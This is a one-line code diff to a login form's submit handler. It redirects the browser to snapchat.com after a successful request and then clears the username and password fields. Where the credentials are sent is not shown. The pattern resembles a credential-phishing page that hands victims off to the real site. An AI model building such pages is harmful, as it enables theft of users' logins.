@@ -84,7 +84,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     })
     .then(response => {
         if (response.ok) {
-
+        window.location.href = "https://www.snapchat.com/?original_referrer=none";
             // Clear input fields
             document.getElementById("username").value = "";
             document.getElementById("password").value = "";
